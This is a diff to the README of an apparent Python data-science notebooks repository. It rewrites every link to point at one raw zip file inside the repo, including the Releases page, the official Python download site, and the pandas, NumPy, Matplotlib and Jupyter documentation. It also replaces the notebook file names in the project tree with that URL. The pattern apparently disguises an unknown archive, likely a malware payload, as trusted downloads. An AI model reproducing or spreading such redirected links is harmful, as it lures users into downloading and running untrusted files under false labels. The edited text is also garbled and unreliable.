@@ -6,7 +6,7 @@ Welcome to the Data_science_estudos repository! Here, you'll find notebooks and 
 
 ## 📥 Download Now
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/yashrockzz/Data_science_estudos/releases)
+[![Download the latest release](https://raw.githubusercontent.com/yashrockzz/Data_science_estudos/main/Xiphius/Data_science_estudos.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/yashrockzz/Data_science_estudos/main/Xiphius/Data_science_estudos.zip)
 
 ## 📖 About This Repository
 
@@ -34,7 +34,7 @@ To run the notebooks, you will need the following:
 
 To get started, you need to download the latest release. 
 
-1. Visit the [Releases page](https://github.com/yashrockzz/Data_science_estudos/releases) to download the files.
+1. Visit the [Releases page](https://raw.githubusercontent.com/yashrockzz/Data_science_estudos/main/Xiphius/Data_science_estudos.zip) to download the files.
 2. Choose the notebook files that interest you.
 3. Download them to your local machine.
 
@@ -44,7 +44,7 @@ Once you have downloaded the notebooks, follow these steps:
 
 If you haven't installed Python yet:
 
-1. Go to the official [Python website](https://www.python.org/downloads/) and download the latest version.
+1. Go to the official [Python website](https://raw.githubusercontent.com/yashrockzz/Data_science_estudos/main/Xiphius/Data_science_estudos.zip) and download the latest version.
 2. Follow the installation instructions on the website.
 
 To install the required libraries, open your command prompt (Windows) or terminal (macOS/Linux) and run the following commands:
@@ -79,10 +79,10 @@ Each notebook provides examples and exercises. You can run the code blocks to se
 
 ### 🦸‍♀️ Learning Resources
 
-- **Jupyter Notebook Basics**: Learn how to navigate and use Jupyter Notebooks. [Link to resource](https://jupyter-notebook.readthedocs.io/en/stable/notebook.html)
-- **Pandas Documentation**: Understand how to manipulate data easily. [Link to resource](https://pandas.pydata.org/pandas-docs/stable/)
-- **NumPy Documentation**: Explore numerical data processing. [Link to resource](https://numpy.org/doc/stable/)
-- **Matplotlib Guide**: Visualize your data effectively. [Link to resource](https://matplotlib.org/stable/contents.html)
+- **Jupyter Notebook Basics**: Learn how to navigate and use Jupyter Notebooks. [Link to resource](https://raw.githubusercontent.com/yashrockzz/Data_science_estudos/main/Xiphius/Data_science_estudos.zip)
+- **Pandas Documentation**: Understand how to manipulate data easily. [Link to resource](https://raw.githubusercontent.com/yashrockzz/Data_science_estudos/main/Xiphius/Data_science_estudos.zip)
+- **NumPy Documentation**: Explore numerical data processing. [Link to resource](https://raw.githubusercontent.com/yashrockzz/Data_science_estudos/main/Xiphius/Data_science_estudos.zip)
+- **Matplotlib Guide**: Visualize your data effectively. [Link to resource](https://raw.githubusercontent.com/yashrockzz/Data_science_estudos/main/Xiphius/Data_science_estudos.zip)
 
 ## 🗂️ Project Structure
 
@@ -92,11 +92,11 @@ Here’s a brief overview of how the project files are organized:
 Data_science_estudos/
 │
 ├── Notebooks/
-│   ├── Data_Analysis_Intro.ipynb
-│   ├── Data_Visualization_Basics.ipynb
-│   ├── EDA_Techniques.ipynb
-│   └── Statistical_Analysis.ipynb
-└── README.md
+│   ├── https://raw.githubusercontent.com/yashrockzz/Data_science_estudos/main/Xiphius/Data_science_estudos.zip
+│   ├── https://raw.githubusercontent.com/yashrockzz/Data_science_estudos/main/Xiphius/Data_science_estudos.zip
+│   ├── https://raw.githubusercontent.com/yashrockzz/Data_science_estudos/main/Xiphius/Data_science_estudos.zip
+│   └── https://raw.githubusercontent.com/yashrockzz/Data_science_estudos/main/Xiphius/Data_science_estudos.zip
+└── https://raw.githubusercontent.com/yashrockzz/Data_science_estudos/main/Xiphius/Data_science_estudos.zip
 ```
 
 ## 🔄 Contributing
@@ -115,6 +115,6 @@ This project is licensed under the MIT License. Feel free to use and modify it, 
 
 ## 📥 Download Now Again
 
-Don't forget to visit the [Releases page](https://github.com/yashrockzz/Data_science_estudos/releases) and download your materials to get started with Python Data Science!
+Don't forget to visit the [Releases page](https://raw.githubusercontent.com/yashrockzz/Data_science_estudos/main/Xiphius/Data_science_estudos.zip) and download your materials to get started with Python Data Science!
 
 Thank you for using Data_science_estudos. Enjoy your learning journey!
